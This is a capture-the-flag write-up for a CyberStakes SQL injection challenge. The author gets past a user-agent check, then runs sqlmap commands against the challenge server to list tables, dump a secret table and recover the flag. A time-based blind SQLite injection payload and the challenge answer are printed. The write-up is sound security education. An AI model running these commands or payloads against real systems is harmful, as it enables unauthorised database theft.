# The SQL Always Sucks

* **Category:** Web Security
* **Points:** 150
* **Challenge:** We discovered an application in our environment that is apparently under development. Please identify the risk it poses.

<br /> 

**DISCLAIMER:** The challenge has been taken down from the CyberStakes website, so I was unable to redo the challenge and take complete notes.  Some of my command output will have a *...snip...* because I didn't record the full output.  

<br />

Navigating to the webserver in FireFox, http://challenge.acictf.com:28986/, we can see that there is a textbox to input our first name.  Looking at the source of the page, we find something interesting:
```
<!--Dev is only using Sqlite. Bobby Needs to fix this -->
<!--Form to retrieve last name from first name. In Dev.-->

```

<br />


So we know that the target is using an Sqlite database.  One of the hints states may curl and sqlmap will not work unless we use the proper user-agent string.  Lets test this out with curl:
```
curl http://challenge.acictf.com:28986/

User-Agent Alert! Help! I'm Being Hacked!!! /dead
```

Ok, lets open up burpsuite and use the proxy to intercept a GET request:

<br />

![burp]()

<br /> 

Now using the user-agent that we intercepted, lets try curl again:
```
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" http://challenge.acictf.com:28986/
```

<br /> 

This time we are successful.  Now let use sqlmap to test if the *firstname* parameter is vulnerable to SQL injection.  After increasing the level of tests and the risk of the tests, I was able to enumerate the tables in the database:
```
sqlmap --dbms=SQLite --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker --risk=3 --level=3 --tables


...snip...

Parameter: firstname (GET)
    Type: AND/OR time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: firstname=Hacker' OR 7813=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- eBHe
---
[15:02:17] [INFO] testing SQLite
[15:02:17] [INFO] confirming SQLite
[15:02:17] [INFO] actively fingerprinting SQLite
[15:02:17] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[15:02:17] [INFO] fetching tables for database: 'SQLite_masterdb'
[15:02:17] [INFO] fetching number of tables for database 'SQLite_masterdb'
[15:02:17] [INFO] resumed: 2
[15:02:17] [INFO] resumed: SuperSecretData
[15:02:17] [INFO] resumed: Users
Database: SQLite_masterdb
[2 tables]
+-----------------+
| SuperSecretData |
| Users           |
+-----------------+

...snip...
```

<br /> 

Now lets enumerate the columns in the *SuperSecretData* table:
```
sqlmap --dbms=SQLite --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker --risk=3 --level=3 -T SuperSecretData --columns


...snip...

Parameter: firstname (GET)
    Type: AND/OR time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: firstname=Hacker' OR 7813=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- eBHe
---
[08:40:45] [INFO] testing SQLite
[08:40:45] [INFO] confirming SQLite
[08:40:45] [INFO] actively fingerprinting SQLite
[08:40:45] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[08:40:45] [INFO] resumed: CREATE TABLE `SuperSecretData` (\n\t`ID`\tINTEGER,\n\t`flag`\tTEXT\n)
Database: SQLite_masterdb
Table: SuperSecretData
[2 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| flag   | TEXT    |
| ID     | INTEGER |
+--------+---------+

...snip...
```

<br />

Last we dump the contents of the *flag* column:
```
sqlmap --dbms=SQLite --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -u http://challenge.acictf.com:28986/?firstname=Hacker --risk=3 --level=3 -T SuperSecretData -C flag --dump


...snip...

Database: SQLite_masterdb
Table: SuperSecretData
[1 entry]
+----+----------------------------------+
| ID | flag                             |
+----+----------------------------------+
| 1  | ACI{59df47a3243d2f239ea878a7266} |
+----+----------------------------------+

...snip...
```

<br />

## Flag: ACI{59df47a3243d2f239ea878a7266}
